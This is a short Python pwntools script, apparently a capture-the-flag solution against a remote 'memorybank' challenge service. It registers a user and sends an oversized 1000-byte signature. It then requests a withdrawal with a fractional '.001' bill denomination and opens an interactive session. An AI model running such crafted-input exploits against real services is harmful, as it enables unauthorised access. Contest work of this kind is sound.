from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'


def main():
    #p = process('./run.sh')
    p = remote('memorybank-tlc4zml47uyjm.shellweplayaga.me', 9005)

    p.recvuntil(b'please')
    p.sendline(b'ticket{...}')

    print(p.recvuntil(b'register with a username'))
    p.sendline(b'random')
    print(p.recvuntil(b'Choose an operation'))
    p.sendline(b'3')
    print(p.recvuntil(b'Enter your signature'))
    p.sendline(b'A' * (1000))
    sleep(2)

    print(p.recvuntil(b'Choose an operation'))
    p.sendline(b'2')
    print(p.recvuntil(b'Enter amount to withdraw: '))
    p.sendline(b'100')
    print(p.recvuntil(b'Enter bill denomination: '))
    p.sendline(b'.001')

    sleep(2)

    print(p.recvuntil(b'Choose an operation'))
    p.sendline(b'4')

    sleep(2)
    #print(p.recvuntil(b'register with a username'))
    #p.sendline(b'bank_manager')

    p.interactive()

if __name__ == '__main__':
    main()
